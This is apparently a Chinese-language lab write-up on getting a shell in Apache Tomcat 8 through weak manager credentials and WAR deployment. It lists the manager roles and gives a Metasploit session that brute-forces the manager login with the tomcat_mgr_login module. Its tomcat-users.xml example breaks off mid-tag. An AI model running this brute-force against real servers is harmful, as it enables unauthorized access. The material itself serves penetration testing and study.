# Apache Tomcat8 弱口令+后台getshell漏洞

## 漏洞描述
Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。

Tomcat7+权限分为：

- manager（后台管理）
  - manager-gui 拥有html页面权限
  - manager-status 拥有查看status的权限
  - manager-script 拥有text接口的权限，和status权限
  - manager-jmx 拥有jmx权限，和status权限
- host-manager（虚拟主机管理）
  - admin-gui 拥有html页面权限
  - admin-script 拥有text接口权限

这些权限的究竟有什么作用，详情阅读 http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html

在`conf/tomcat-users.xml`文件中配置用户的权限：

```
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
### metasploit爆破tomcat弱口令

访问`http://your-ip:8080/`，点击Manager App：

![image-20220412133434883](images/image-20220412133434883.png)

跳转tomcat管理页面`http://your-ip:8080/manager/html`，提示输入用户名和密码：

![image-20220412133846764](images/image-20220412133846764.png)


## Payloads
```
┌──(root kali)-[/home/kali]
└─# msfconsole

# 搜索tomcat相关模块
msf6 > search tomcat
...
   23  auxiliary/scanner/http/tomcat_mgr_login	normal     No     Tomcat Application Manager Login Utility
...

# 使用tomcat_mgr_login模块进行爆破
msf6 > use auxiliary/scanner/http/tomcat_mgr_login

# 设置服务地址
msf6 auxiliary(scanner/http/tomcat_mgr_login) >show options
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <your-ip>
RHOSTS => <your-ip>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```
